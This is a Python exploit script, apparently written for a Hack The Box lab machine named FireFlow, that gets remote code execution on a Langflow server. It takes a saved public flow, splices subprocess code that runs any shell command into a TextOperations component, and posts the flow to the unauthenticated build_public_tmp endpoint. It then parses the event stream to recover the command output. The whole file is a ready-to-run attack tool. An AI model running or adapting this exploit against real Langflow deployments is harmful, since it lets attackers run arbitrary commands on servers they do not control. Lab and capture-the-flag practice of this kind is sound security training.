#!/usr/bin/env python3
"""FireFlow — RCE via Langflow build_public_tmp + injected component code."""
import json
import ssl
import sys
import time
import urllib.request

HOST = "flow.fireflow.htb"
IP = "10.129.244.214"
FLOW_ID = "7d84d636-af65-42e4-ac38-26e867052c25"
FLOW_PATH = "/home/kali/Desktop/htb/FireFlow/loot/public_flow.json"
CLIENT_ID = "pwn-build-001"
_args = [a for a in sys.argv[1:] if a != "--quiet"]
CMD = _args[0] if _args else "id"

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def req(url, data=None, method="GET"):
    headers = {"Host": HOST, "Cookie": f"client_id={CLIENT_ID}"}
    if data is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(data).encode()
    r = urllib.request.Request(
        f"https://{IP}{url}", data=data, headers=headers, method=method
    )
    with urllib.request.urlopen(r, context=CTX, timeout=120) as resp:
        return resp.status, resp.read(500_000).decode(errors="replace")


def inject_rce(flow: dict, cmd: str) -> dict:
    needle = 'def process_text(self) -> Any:\n        """Process text based on selected operation."""'
    repl = (
        'def process_text(self) -> Any:\n        """Process text based on selected operation."""\n'
        "        import subprocess as _sp\n"
        f"        _r = _sp.run({cmd!r}, shell=True, text=True, capture_output=True)\n        return (_r.stdout or '') + (_r.stderr or '')\n"
    )
    for node in flow["data"]["nodes"]:
        if "TextOperations" in node["data"].get("id", ""):
            code = node["data"]["node"]["template"]["code"]["value"]
            if needle not in code:
                raise SystemExit("needle not found in component code")
            node["data"]["node"]["template"]["code"]["value"] = code.replace(
                needle, repl, 1
            )
            break
    else:
        raise SystemExit("TextOperations node not found")
    return flow


def extract_cmd_output(events: str) -> str:
    import re

    for line in events.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            obj = json.loads(line)
        except json.JSONDecodeError:
            continue
        if obj.get("event") != "end_vertex":
            continue
        bd = obj.get("data", {}).get("build_data", {})
        msg = (
            bd.get("data", {})
            .get("results", {})
            .get("message", {})
            .get("data", {})
            .get("text", "")
        )
        if not msg:
            art = bd.get("artifacts", {}) or bd.get("data", {}).get("artifacts", {})
            if isinstance(art, dict):
                msg = art.get("message", "") if isinstance(art.get("message"), str) else ""
        if msg and bd.get("id", "").startswith(("TextOperations", "ChatOutput")):
            return msg
    return ""


def main():
    quiet = "--quiet" in sys.argv
    flow = json.load(open(FLOW_PATH))
    inject_rce(flow, CMD)
    body = {"inputs": {"input_value": "x"}, "data": flow["data"]}
    st, out = req(f"/api/v1/build_public_tmp/{FLOW_ID}/flow", body, "POST")
    job = json.loads(out)["job_id"]
    st, events = req(f"/api/v1/build_public_tmp/{job}/events")
    result = extract_cmd_output(events)
    if quiet:
        sys.stdout.write(result)
        return
    print("[*] build", st, out[:200])
    print("[*] events", st)
    print(result or events[-4000:])


if __name__ == "__main__":
    main()